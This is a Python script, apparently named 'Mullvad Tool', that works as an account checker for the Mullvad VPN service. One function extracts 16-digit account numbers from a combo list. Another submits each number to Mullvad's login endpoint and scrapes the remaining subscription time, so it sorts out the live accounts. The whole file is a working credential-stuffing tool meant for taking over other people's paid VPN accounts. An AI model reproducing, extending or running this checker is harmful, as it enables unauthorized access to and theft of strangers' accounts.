import requests, os, re
from bs4 import BeautifulSoup

def clear_screen():
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        _ = os.system('cls')

def menu():
    clear_screen()
    print("""
███╗   ███╗██╗   ██╗██╗     ██╗    ██╗   ██╗ █████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
████╗ ████║██║   ██║██║     ██║    ██║   ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██╔████╔██║██║   ██║██║     ██║    ██║   ██║███████║██║  ██║       ██║   ██║   ██║██║   ██║██║     
██║╚██╔╝██║██║   ██║██║     ██║    ╚██╗ ██╔╝██╔══██║██║  ██║       ██║   ██║   ██║██║   ██║██║     
██║ ╚═╝ ██║╚██████╔╝███████╗███████╗╚████╔╝ ██║  ██║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ╚═══╝  ╚═╝  ╚═╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        made by ゆうぽん＃チック症  「チェック」だけに「チック」!wwwwwwwwwww
        [01] Live Checker   [02] Combo Formatter                                                                          
    """)
    mode = int(input("Mode>> "))
    if mode == 1:
        print("insert ids in list.txt first")
        checker()
    if mode == 2:
        print("insert combo txt in combo.txt")
        formatter()
        print("saved to list.txt")
    else:
        menu()

def live_check(id: str):
    session = requests.session()
    res = session.post("https://mullvad.net/en/account/login", data={"account_number": id}, headers={"Origin": "https://mullvad.net"}).json()
    if res["type"] == "redirect":
        res2 = session.get("https://mullvad.net/en/account")
        soup = BeautifulSoup(res2.text, "html.parser")
        time = soup.find(attrs={"data-cy": "account-expiry"}).text
        # time = session.get("https://mullvad.net/en/account/__data.json", params={"x-sveltekit-invalidated": "0110"}, cookies={"accessToken": session.cookies["accessToken"]}).json()["nodes"][1]["data"][4]
        print(f"{time} | {id}")
    else:
        print(f"Failed to login | {id}")

def checker():
    with open("./data/list.txt", "r", encoding="utf-8") as file:
        ids = file.readlines()
    for id in ids:
        live_check(id)

def formatter():
    content = ""
    with open("./data/combo.txt","r",errors="ignore",encoding="utf-8") as f:
        text = f.read()
    num = list(set(re.findall(r"\b(\d{16}|\d{4}[:\s]\d{4}[:\s]\d{4}[:\s]\d{4})\b", text)))
    for contents in num:
        contents = contents.replace(" ","").replace(":","")
        content+=f"{contents}\n"
    with open("./data/list.txt","w",errors="ignore", encoding="utf-8") as f:
        f.write(f"{content}")

menu()
